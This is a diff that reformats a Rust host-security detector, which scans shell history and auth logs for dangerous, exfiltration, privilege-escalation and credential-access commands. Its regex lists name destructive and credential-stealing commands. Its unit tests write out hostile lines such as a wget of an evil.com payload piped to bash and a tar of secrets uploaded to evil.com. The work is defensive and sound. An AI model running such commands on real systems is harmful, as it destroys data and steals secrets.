@@ -20,7 +20,9 @@ pub struct UserBehaviorDetector {
 
 impl UserBehaviorDetector {
     pub fn new() -> Self {
-        Self { findings: Vec::new() }
+        Self {
+            findings: Vec::new(),
+        }
     }
 
     /// Analyze shell history for anomalous patterns
@@ -28,7 +30,10 @@ impl UserBehaviorDetector {
         let history_sources = [
             ("bash", format!("{}/.bash_history", Self::home_dir())),
             ("zsh", format!("{}/.zsh_history", Self::home_dir())),
-            ("fish", format!("{}/.local/share/fish/fish_history", Self::home_dir())),
+            (
+                "fish",
+                format!("{}/.local/share/fish/fish_history", Self::home_dir()),
+            ),
         ];
 
         for (shell, path) in &history_sources {
@@ -46,9 +51,7 @@ impl UserBehaviorDetector {
 
     /// Parse and analyze history file content
     fn analyze_history_content(&mut self, shell: &str, content: &str) {
-        let commands: Vec<&str> = content.lines()
-            .filter(|l| !l.trim().is_empty())
-            .collect();
+        let commands: Vec<&str> = content.lines().filter(|l| !l.trim().is_empty()).collect();
 
         if commands.is_empty() {
             return;
@@ -92,7 +95,8 @@ impl UserBehaviorDetector {
                 ),
                 confidence: 0.50,
                 location: Some(format!("{} shell history", shell)),
-                recommendation: "Review shell history size. Consider `history -c` if needed.".into(),
+                recommendation: "Review shell history size. Consider `history -c` if needed."
+                    .into(),
             });
         }
     }
@@ -100,21 +104,69 @@ impl UserBehaviorDetector {
     /// Detect dangerous or malicious command sequences
     fn check_dangerous_commands(&mut self, commands: &[&str], shell: &str) {
         let dangerous_patterns: &[(&str, Severity, &str)] = &[
-            (r"(?i)rm\s+-rf\s+/\s*$", Severity::Critical, "Destructive rm -rf /"),
+            (
+                r"(?i)rm\s+-rf\s+/\s*$",
+                Severity::Critical,
+                "Destructive rm -rf /",
+            ),
             (r"(?i)rm\s+-rf\s+~", Severity::High, "Destructive rm -rf ~"),
-            (r"(?i)dd\s+if=.*of=\/dev", Severity::Critical, "Destructive dd to device"),
-            (r"(?i):\(\)\s*\{.*:\(\)\s*;", Severity::Critical, "Fork bomb detected"),
-            (r"(?i)wget.*\|.*bash", Severity::Critical, "Piped web script execution"),
-            (r"(?i)curl.*\|.*bash", Severity::Critical, "Piped web script execution"),
-            (r"(?i)chmod\s+-R\s+777\s+/", Severity::Critical, "World-writable entire filesystem"),
+            (
+                r"(?i)dd\s+if=.*of=\/dev",
+                Severity::Critical,
+                "Destructive dd to device",
+            ),
+            (
+                r"(?i):\(\)\s*\{.*:\(\)\s*;",
+                Severity::Critical,
+                "Fork bomb detected",
+            ),
+            (
+                r"(?i)wget.*\|.*bash",
+                Severity::Critical,
+                "Piped web script execution",
+            ),
+            (
+                r"(?i)curl.*\|.*bash",
+                Severity::Critical,
+                "Piped web script execution",
+            ),
+            (
+                r"(?i)chmod\s+-R\s+777\s+/",
+                Severity::Critical,
+                "World-writable entire filesystem",
+            ),
             (r"(?i)passwd\s+root", Severity::High, "Root password change"),
-            (r"(?i)useradd\s+-o\s+-u\s+0", Severity::Critical, "Backdoor user creation (UID 0)"),
-            (r"(?i)usermod\s+-o\s+-u\s+0", Severity::Critical, "Backdoor user modification (UID 0)"),
-            (r"(?i)mv\s+/etc/passwd", Severity::Critical, "Modifying passwd file"),
-            (r"(?i)mv\s+/etc/shadow", Severity::Critical, "Modifying shadow file"),
-            (r"(?i)iptables\s+-F", Severity::High, "Flushing iptables rules"),
+            (
+                r"(?i)useradd\s+-o\s+-u\s+0",
+                Severity::Critical,
+                "Backdoor user creation (UID 0)",
+            ),
+            (
+                r"(?i)usermod\s+-o\s+-u\s+0",
+                Severity::Critical,
+                "Backdoor user modification (UID 0)",
+            ),
+            (
+                r"(?i)mv\s+/etc/passwd",
+                Severity::Critical,
+                "Modifying passwd file",
+            ),
+            (
+                r"(?i)mv\s+/etc/shadow",
+                Severity::Critical,
+                "Modifying shadow file",
+            ),
+            (
+                r"(?i)iptables\s+-F",
+                Severity::High,
+                "Flushing iptables rules",
+            ),
             (r"(?i)ufw\s+disable", Severity::Medium, "Disabling firewall"),
-            (r"(?i)systemctl\s+stop\s+(firewalld|ufw|iptables)", Severity::High, "Stopping firewall service"),
+            (
+                r"(?i)systemctl\s+stop\s+(firewalld|ufw|iptables)",
+                Severity::High,
+                "Stopping firewall service",
+            ),
         ];
 
         for (i, cmd) in commands.iter().enumerate() {
@@ -150,14 +202,42 @@ impl UserBehaviorDetector {
     /// Detect data exfiltration patterns
     fn check_exfiltration_patterns(&mut self, commands: &[&str], shell: &str) {
         let exfil_patterns: &[(&str, Severity, &str)] = &[
-            (r"(?i)(scp|rsync)\s+.*\w+@\w+\.\w+", Severity::High, "SCP/rsync to external host"),
-            (r"(?i)(curl|wget)\s+--(data|post-file|upload)", Severity::High, "Data upload to remote"),
-            (r"(?i)nc\s+.*\d{4,5}\s*<", Severity::High, "Netcat data send"),
+            (
+                r"(?i)(scp|rsync)\s+.*\w+@\w+\.\w+",
+                Severity::High,
+                "SCP/rsync to external host",
+            ),
+            (
+                r"(?i)(curl|wget)\s+--(data|post-file|upload)",
+                Severity::High,
+                "Data upload to remote",
+            ),
+            (
+                r"(?i)nc\s+.*\d{4,5}\s*<",
+                Severity::High,
+                "Netcat data send",
+            ),
             (r"(?i)ncat\s+.*--send", Severity::High, "Ncat data send"),
-            (r"(?i)tar\s+.*\|.*(nc|ncat|curl|ssh)", Severity::High, "Tar piped to network"),
-            (r"(?i)base64\s+.*\|.*(curl|wget|nc|ssh)", Severity::High, "Base64 encoded exfiltration"),
-            (r"(?i)cat\s+.*\.(sql|db|dump|backup)\s*\|", Severity::High, "Database file piped"),
-            (r"(?i)mysqldump.*\|.*gzip.*\|.*(nc|curl)", Severity::Critical, "Database exfiltration"),
+            (
+                r"(?i)tar\s+.*\|.*(nc|ncat|curl|ssh)",
+                Severity::High,
+                "Tar piped to network",
+            ),
+            (
+                r"(?i)base64\s+.*\|.*(curl|wget|nc|ssh)",
+                Severity::High,
+                "Base64 encoded exfiltration",
+            ),
+            (
+                r"(?i)cat\s+.*\.(sql|db|dump|backup)\s*\|",
+                Severity::High,
+                "Database file piped",
+            ),
+            (
+                r"(?i)mysqldump.*\|.*gzip.*\|.*(nc|curl)",
+                Severity::Critical,
+                "Database exfiltration",
+            ),
         ];
 
         for (i, cmd) in commands.iter().enumerate() {
@@ -177,7 +257,8 @@ impl UserBehaviorDetector {
                             confidence: 0.75,
                             location: Some(format!("shell:{}", i + 1)),
                             recommendation: "Verify data transfer was authorized. \
-                                             Consider data loss prevention (DLP) policies.".into(),
+                                             Consider data loss prevention (DLP) policies."
+                                .into(),
                         });
                     }
                 }
@@ -195,7 +276,8 @@ impl UserBehaviorDetector {
         let window = 50;
         if commands.len() >= window {
             let recent: Vec<&&str> = commands.iter().rev().take(window).collect();
-            let recent_compress = recent.iter()
+            let recent_compress = recent
+                .iter()
                 .filter(|cmd| {
                     regex_lite::Regex::new(r"(?i)(zip|tar|gzip)\s+.*\w+")
                         .map(|re| re.is_match(cmd))
@@ -222,7 +304,12 @@ impl UserBehaviorDetector {
     }
 
     /// Detect privilege escalation patterns
-    fn check_privilege_escalation(&mut self, commands: &[&str], shell: &str, cmd_counts: &HashMap<String, usize>) {
+    fn check_privilege_escalation(
+        &mut self,
+        commands: &[&str],
+        shell: &str,
+        cmd_counts: &HashMap<String, usize>,
+    ) {
         // Count sudo usage
         let sudo_count = *cmd_counts.get("sudo").unwrap_or(&0);
         let total_commands: usize = cmd_counts.values().sum();
@@ -239,12 +326,17 @@ impl UserBehaviorDetector {
                         "{} out of {} commands ({:.0}%) use sudo in {} shell. \
                          Excessive sudo usage may indicate privilege escalation attempts \
                          or poor permission management.",
-                        sudo_count, total_commands, sudo_ratio * 100.0, shell
+                        sudo_count,
+                        total_commands,
+                        sudo_ratio * 100.0,
+                        shell
                     ),
                     confidence: 0.60,
                     location: Some(format!("{} shell", shell)),
-                    recommendation: "Review sudoers configuration. Consider reducing sudo requirements \
-                                     or using `sudo -l` to audit permissions.".into(),
+                    recommendation:
+                        "Review sudoers configuration. Consider reducing sudo requirements \
+                                     or using `sudo -l` to audit permissions."
+                            .into(),
                 });
             }
         }
@@ -253,11 +345,27 @@ impl UserBehaviorDetector {
         let esc_patterns: &[(&str, &str, Severity)] = &[
             (r"(?i)sudo\s+su\s*-", "sudo su -", Severity::Medium),
             (r"(?i)sudo\s+bash", "sudo bash", Severity::Medium),
-            (r#"(?i)sudo\s+python\s+-c\s+['"](import pty|import os)"#, "sudo python command injection", Severity::High),
-            (r"(?i)sudo\s+perl\s+-e", "sudo perl execution", Severity::High),
+            (
+                r#"(?i)sudo\s+python\s+-c\s+['"](import pty|import os)"#,
+                "sudo python command injection",
+                Severity::High,
+            ),
+            (
+                r"(?i)sudo\s+perl\s+-e",
+                "sudo perl execution",
+                Severity::High,
+            ),
             (r"(?i)pkexec\s+bash", "pkexec bash", Severity::High),
-            (r"(?i)sudo\s+--preserve-env", "sudo environment preservation", Severity::Medium),
-            (r"(?i)sudoedit\s+/etc/", "sudoedit on system files", Severity::High),
+            (
+                r"(?i)sudo\s+--preserve-env",
+                "sudo environment preservation",
+                Severity::Medium,
+            ),
+            (
+                r"(?i)sudoedit\s+/etc/",
+                "sudoedit on system files",
+                Severity::High,
+            ),
         ];
 
         for cmd in commands {
@@ -286,17 +394,40 @@ impl UserBehaviorDetector {
     /// Detect reconnaissance patterns (attackers often probe the system first)
     fn check_recon_patterns(&mut self, commands: &[&str], shell: &str) {
         let recon_cmds = [
-            "find", "locate", "ls -la", "ls -al",
-            "cat /etc/passwd", "cat /etc/shadow",
-            "uname -a", "id", "whoami", "who",
-            "w", "last", "lastlog", "lsof",
-            "netstat", "ss -tuln", "ss -tupan",
-            "ps aux", "ps -ef", "top", "htop",
-            "ifconfig", "ip a", "ip addr",
-            "arp -a", "route -n", "nmap",
-            "crontab -l", "systemctl list-timers",
-            "mount", "df -h", "lsblk",
-            "getenforce", "sestatus",
+            "find",
+            "locate",
+            "ls -la",
+            "ls -al",
+            "cat /etc/passwd",
+            "cat /etc/shadow",
+            "uname -a",
+            "id",
+            "whoami",
+            "who",
+            "w",
+            "last",
+            "lastlog",
+            "lsof",
+            "netstat",
+            "ss -tuln",
+            "ss -tupan",
+            "ps aux",
+            "ps -ef",
+            "top",
+            "htop",
+            "ifconfig",
+            "ip a",
+            "ip addr",
+            "arp -a",
+            "route -n",
+            "nmap",
+            "crontab -l",
+            "systemctl list-timers",
+            "mount",
+            "df -h",
+            "lsblk",
+            "getenforce",
+            "sestatus",
         ];
 
         let mut _recon_count = 0;
@@ -314,7 +445,8 @@ impl UserBehaviorDetector {
         let window = 100;
         if commands.len() >= window {
             let recent: Vec<&str> = commands.iter().rev().take(window).copied().collect();
-            let recent_recon = recent.iter()
+            let recent_recon = recent
+                .iter()
                 .filter(|cmd| {
                     let lower = cmd.to_lowercase();
                     recon_cmds.iter().any(|p| lower.contains(&p.to_lowercase()))
@@ -329,13 +461,16 @@ impl UserBehaviorDetector {
                     description: format!(
                         "{} of the last {} commands ({:.0}%) are system reconnaissance commands. \
                          This pattern is consistent with attacker behavior during initial access.",
-                        recent_recon, window,
+                        recent_recon,
+                        window,
                         (recent_recon as f64 / window as f64) * 100.0
                     ),
                     confidence: 0.65,
                     location: Some(format!("{} shell", shell)),
-                    recommendation: "Audit user activity. If unexpected, investigate for potential breach. \
-                                     Consider implementing command auditing with auditd.".into(),
+                    recommendation:
+                        "Audit user activity. If unexpected, investigate for potential breach. \
+                                     Consider implementing command auditing with auditd."
+                            .into(),
                 });
             }
         }
@@ -344,16 +479,56 @@ impl UserBehaviorDetector {
     /// Detect attempts to access credentials
     fn check_credential_access(&mut self, commands: &[&str], shell: &str) {
         let cred_patterns: &[(&str, &str, Severity)] = &[
-            (r"(?i)cat\s+/etc/shadow", "Reading /etc/shadow", Severity::Critical),
-            (r"(?i)cat\s+/etc/passwd", "Reading /etc/passwd", Severity::Medium),
-            (r"(?i)cat\s+/etc/sudoers", "Reading /etc/sudoers", Severity::High),
-            (r#"(?i)find\s+/.*-name\s+['"]*authorized_keys['"]*"#, "Searching for SSH keys", Severity::High),
-            (r#"(?i)find\s+/.*-name\s+['"]*\.env['"]*"#, "Searching for .env files", Severity::High),
-            (r#"(?i)find\s+/.*-name\s+['"]*id_rsa['"]*"#, "Searching for SSH private keys", Severity::Critical),
-            (r"(?i)aws\s+configure\s+(list|export)", "AWS credential access", Severity::High),
-            (r"(?i)cat\s+.*\.aws/credentials", "Reading AWS credentials", Severity::Critical),
-            (r"(?i)cat\s+.*\.kube/config", "Reading kube config", Severity::High),
-            (r"(?i)strings\s+.*\.(key|pem|crt|p12)", "Extracting secrets from binary", Severity::High),
+            (
+                r"(?i)cat\s+/etc/shadow",
+                "Reading /etc/shadow",
+                Severity::Critical,
+            ),
+            (
+                r"(?i)cat\s+/etc/passwd",
+                "Reading /etc/passwd",
+                Severity::Medium,
+            ),
+            (
+                r"(?i)cat\s+/etc/sudoers",
+                "Reading /etc/sudoers",
+                Severity::High,
+            ),
+            (
+                r#"(?i)find\s+/.*-name\s+['"]*authorized_keys['"]*"#,
+                "Searching for SSH keys",
+                Severity::High,
+            ),
+            (
+                r#"(?i)find\s+/.*-name\s+['"]*\.env['"]*"#,
+                "Searching for .env files",
+                Severity::High,
+            ),
+            (
+                r#"(?i)find\s+/.*-name\s+['"]*id_rsa['"]*"#,
+                "Searching for SSH private keys",
+                Severity::Critical,
+            ),
+            (
+                r"(?i)aws\s+configure\s+(list|export)",
+                "AWS credential access",
+                Severity::High,
+            ),
+            (
+                r"(?i)cat\s+.*\.aws/credentials",
+                "Reading AWS credentials",
+                Severity::Critical,
+            ),
+            (
+                r"(?i)cat\s+.*\.kube/config",
+                "Reading kube config",
+                Severity::High,
+            ),
+            (
+                r"(?i)strings\s+.*\.(key|pem|crt|p12)",
+                "Extracting secrets from binary",
+                Severity::High,
+            ),
         ];
 
         for (i, cmd) in commands.iter().enumerate() {
@@ -384,12 +559,12 @@ impl UserBehaviorDetector {
     /// Analyze current login session and system state
     fn analyze_current_session(&mut self) {
         // Check active sessions
-        if let Ok(output) = std::process::Command::new("who")
-            .arg("-u")
-            .output()
-        {
+        if let Ok(output) = std::process::Command::new("who").arg("-u").output() {
             let output_str = String::from_utf8_lossy(&output.stdout);
-            let sessions: Vec<&str> = output_str.lines().filter(|l| !l.trim().is_empty()).collect();
+            let sessions: Vec<&str> = output_str
+                .lines()
+                .filter(|l| !l.trim().is_empty())
+                .collect();
 
             if sessions.len() > 3 {
                 self.findings.push(Finding {
@@ -404,15 +579,14 @@ impl UserBehaviorDetector {
                     confidence: 0.45,
                     location: None,
                     recommendation: "Review active sessions with `who -u` and `last`. \
-                                     Verify all sessions are authorized.".into(),
+                                     Verify all sessions are authorized."
+                        .into(),
                 });
             }
         }
 
         // Check last login time
-        if let Ok(output) = std::process::Command::new("lastlog")
-            .output()
-        {
+        if let Ok(output) = std::process::Command::new("lastlog").output() {
             let output_str = String::from_utf8_lossy(&output.stdout);
             let lines: Vec<&str> = output_str.lines().collect();
             if lines.len() > 30 {
@@ -422,7 +596,8 @@ impl UserBehaviorDetector {
 
         // Check for failed login attempts
         if let Ok(content) = std::fs::read_to_string("/var/log/auth.log") {
-            let failed_count = content.lines()
+            let failed_count = content
+                .lines()
                 .filter(|l| l.contains("Failed password") || l.contains("authentication failure"))
                 .count();
 
@@ -439,11 +614,13 @@ impl UserBehaviorDetector {
                     confidence: 0.85,
                     location: Some("/var/log/auth.log".into()),
                     recommendation: "Check `/var/log/auth.log` for details. \
-                                     Consider fail2ban or rate-limiting SSH access.".into(),
+                                     Consider fail2ban or rate-limiting SSH access."
+                        .into(),
                 });
             }
         } else if let Ok(content) = std::fs::read_to_string("/var/log/secure") {
-            let failed_count = content.lines()
+            let failed_count = content
+                .lines()
                 .filter(|l| l.contains("Failed password"))
                 .count();
             if failed_count > 100 {
@@ -459,7 +636,8 @@ impl UserBehaviorDetector {
                     confidence: 0.85,
                     location: Some("/var/log/secure".into()),
                     recommendation: "Check `/var/log/secure` for details. \
-                                     Consider fail2ban or rate-limiting SSH access.".into(),
+                                     Consider fail2ban or rate-limiting SSH access."
+                        .into(),
                 });
             }
         }
@@ -477,7 +655,8 @@ impl UserBehaviorDetector {
 
     /// Get username for reporting
     fn username() -> String {
-        std::env::var("USER").unwrap_or_else(|_| std::env::var("LOGNAME").unwrap_or_else(|_| "unknown".to_string()))
+        std::env::var("USER")
+            .unwrap_or_else(|_| std::env::var("LOGNAME").unwrap_or_else(|_| "unknown".to_string()))
     }
 }
 
@@ -506,11 +685,14 @@ impl Detector for UserBehaviorDetector {
                 severity: Severity::Info,
                 category: "user_behavior".into(),
                 title: "User behavior analysis not available on this platform".into(),
-                description: "User behavior analysis requires access to shell history and system logs, \
-                             which are only available on Unix-like systems.".into(),
+                description:
+                    "User behavior analysis requires access to shell history and system logs, \
+                             which are only available on Unix-like systems."
+                        .into(),
                 confidence: 1.0,
                 location: None,
-                recommendation: "Run this detector on a Linux or macOS system for full analysis.".into(),
+                recommendation: "Run this detector on a Linux or macOS system for full analysis."
+                    .into(),
             });
         }
 
@@ -551,10 +733,16 @@ mod tests {
             "wget http://evil.com/payload.sh | bash",
         ];
         detector.analyze_history_content("bash", &commands.join("\n"));
-        let dangerous: Vec<_> = detector.findings.iter()
+        let dangerous: Vec<_> = detector
+            .findings
+            .iter()
             .filter(|f| f.title.contains("Dangerous command"))
             .collect();
-        assert_eq!(dangerous.len(), 2, "Should detect rm -rf / and wget pipe to bash");
+        assert_eq!(
+            dangerous.len(),
+            2,
+            "Should detect rm -rf / and wget pipe to bash"
+        );
     }
 
     #[test]
@@ -566,7 +754,9 @@ mod tests {
             "tar czf - secrets/ | curl -X POST http://evil.com/upload --data-binary @-",
         ];
         detector.analyze_history_content("bash", &commands.join("\n"));
-        let exfil: Vec<_> = detector.findings.iter()
+        let exfil: Vec<_> = detector
+            .findings
+            .iter()
             .filter(|f| f.title.contains("exfiltration"))
             .collect();
         assert!(!exfil.is_empty(), "Should detect exfiltration patterns");
@@ -581,7 +771,9 @@ mod tests {
             "cat ~/.aws/credentials",
         ];
         detector.analyze_history_content("bash", &commands.join("\n"));
-        let cred: Vec<_> = detector.findings.iter()
+        let cred: Vec<_> = detector
+            .findings
+            .iter()
             .filter(|f| f.title.contains("Credential access"))
             .collect();
         assert!(!cred.is_empty(), "Should detect credential access");
@@ -597,7 +789,9 @@ mod tests {
 
         detector.analyze_history_content("bash", &commands.join("\n"));
         // Should detect excessive sudo usage
-        let excessive: Vec<_> = detector.findings.iter()
+        let excessive: Vec<_> = detector
+            .findings
+            .iter()
             .filter(|f| f.title.contains("Excessive sudo"))
             .collect();
         assert!(!excessive.is_empty(), "Should detect excessive sudo usage");
